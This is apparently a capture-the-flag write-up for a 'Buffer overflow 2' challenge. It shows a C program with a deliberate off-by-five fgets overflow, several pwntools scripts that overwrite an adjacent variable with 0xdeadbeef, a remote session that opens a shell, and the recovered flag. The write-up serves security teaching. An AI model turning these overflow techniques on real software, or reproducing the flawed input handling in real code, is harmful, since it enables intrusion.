# Buffer overflow 2

## Description

> Can you deadbeef the program??

## Write-Up

### Discovery

Let's check out the given code first :

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>


int main()
{
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  char buf[40];
  int check = 0x10101010;
  
  fgets(buf,45,stdin);
     
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
    
  if ((check != 0x10101010) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
    
  else if (check == 0xdeadbeef)
  {
    printf("Yeah dude! You win!\nOpening your shell...\n");
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
    printf("Shell closed! Bye.\n");
  }
  return 0;
}
```

As we can see, even if the author used the `fgets()` function to read input (More secure than `gets()` function), but he is actually ready `45` chars, which is larger then the `buf` buffer he is using (`40` bytes or chars long). So, if the user enters a large string as an input (between `41` and `45`), this may lead to a **Segmentation fault** due to a **Buffer Overflow** attack.

## Exploration

Let's try to mess arround with the code a little :

1. Before we start, let's create a string that is long enough to fill up the whole `buf` variable, we will be using `cyclic` that creates a stateful cyclic generator which can generate sequential chunks of de Bruijn sequences:

```
└─$ cyclic 40 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
```

2. Now, let's inject some payloads :
 - First, injecting our payload like it is will only fill perfectly the `buf` string without generating any error :

```
└─$ ./chall
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa

[check] 0x10101010
```

  - Also, Injecting only two addinional will not effect the program :

```
└─$ ./chall
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka   

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka

[check] 0x10101010
```

 - The program starts to get errors only from the 3rd added byte (Mote the changing value of the `check` value) :

```
─$ ./chall
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaa  

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaa

[check] 0x10101000

You are on the right way!
```

 - Of course, using more than 4 additional bytes (last one reserved to the closing char `\0`) will crash out the added bytes :

```
─$ ./chall
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa

[check] 0x10101000

You are on the right way!

─$ laa
```

 - Now, let's use some scripting to pass out the data (with pwn tools) :

```py
#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xdd\xdd\xdd\xdd')

p.interactive()
```

```
[+] Starting local process './chall': pid 9114
[*] Switching to interactive mode

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xdd\xdd\xdd\xdd
[check] 0xdddddddd

You are on the right way!
[*] Process './chall' stopped with exit code 0 (pid 9114)
[*] Got EOF while reading in interactive
```

 - Of course, in order to solve the challenge correct, let's remind ourselves that the stack stores the data :

<br>

> The stack stores data **from the top down**, following a last in, first out (LIFO) data structure. This means that the program adds data to the top of the stack and removes data from the top of the stack. In this way, the top of the stack always contains the most recently stored data that has not yet been removed.

<br>

```py
...
p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xda\xdb\xdd\xdd')
...
```


```
[+] Starting local process './chall': pid 9355
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 9355)

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xda\xdb\xdd\xdd
[check] 0xdddddbda

You are on the right way!
[*] Got EOF while reading in interactive
```

### Solution 

When we see the code closeling, we can find out that there is a specific data that must be written in the `check` variable in order for us to bypass the conditions and get the `shell` :

```c
...
  else if (check == 0xdeadbeef)
  {
    printf("Yeah dude! You win!\nOpening your shell...\n");
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
...
```

So, let's try to inject the value in our payload :

```py
...
p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xef\xbe\xad\xde')
...
```

Here is the result locally :


```
[+] Starting local process './chall': pid 9666
[*] Switching to interactive mode

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaﾭ\xde
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
$
$ echo "Hello"
Hello
$ whoami
rivench
$ exit
Shell closed! Bye.
```

Here is the remote script :

```py
#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1402'

p = remote(HOST, PORT)

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xef\xbe\xad\xde')

p.interactive()
```

```
[+] Opening connection to pwn.challs.ctf.shellmates.club on port 1402: Done
[*] Switching to interactive mode

[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaﾭ\xde
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
$ ls
chall
entrypoint.sh
flag.txt
$ whoami
nobody
$ cat flag.txt
shellmates{D34D_B333333333F_IN70_t|-|E_$ERV3R}
$ exit
Shell closed! Bye.
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

## Flag

shellmates{D34D_B333333333F_IN70_t|-|E_$ERV3R}
